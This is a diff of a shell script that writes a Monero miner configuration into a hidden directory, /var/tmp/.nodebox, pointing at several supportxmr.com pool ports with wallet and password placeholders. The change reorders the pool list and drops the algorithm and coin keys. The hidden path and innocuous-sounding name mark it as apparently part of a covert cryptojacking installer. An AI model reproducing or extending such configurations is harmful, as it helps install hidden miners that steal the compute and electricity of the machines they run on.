@@ -237,8 +237,13 @@ cat >/var/tmp/.nodebox/config.json <<EOL
     "cuda": false,
     "pools": [
         {
-            "algo": "rx/0",
-            "coin": "monero",
+            "url": "pool.supportxmr.com:3333",
+            "user": "$WALLET",
+            "pass": "$PASS",
+            "keepalive": true,
+            "tls": false
+        },
+        {
             "url": "pool.supportxmr.com:443",
             "user": "$WALLET",
             "pass": "$PASS",
@@ -246,8 +251,6 @@ cat >/var/tmp/.nodebox/config.json <<EOL
             "tls": true
         },
         {
-            "algo": "rx/0",
-            "coin": "monero",
             "url": "pool.supportxmr.com:8080",
             "user": "$WALLET",
             "pass": "$PASS",
@@ -255,8 +258,6 @@ cat >/var/tmp/.nodebox/config.json <<EOL
             "tls": false
         },
         {
-            "algo": "rx/0",
-            "coin": "monero",
             "url": "pool.supportxmr.com:7777",
             "user": "$WALLET",
             "pass": "$PASS",
@@ -264,8 +265,6 @@ cat >/var/tmp/.nodebox/config.json <<EOL
             "tls": false
         },
         {
-            "algo": "rx/0",
-            "coin": "monero",
             "url": "pool.supportxmr.com:5555",
             "user": "$WALLET",
             "pass": "$PASS",
@@ -273,18 +272,7 @@ cat >/var/tmp/.nodebox/config.json <<EOL
             "tls": false
         },
         {
-            "algo": "rx/0",
-            "coin": "monero",
             "url": "pool.supportxmr.com:80",
-            "user": "$WALLET",
-            "pass": "$PASS",
-            "keepalive": true,
-            "tls": false
-        },
-        {
-            "algo": "rx/0",
-            "coin": "monero",
-            "url": "pool.supportxmr.com:3333",
             "user": "$WALLET",
             "pass": "$PASS",
             "keepalive": true,
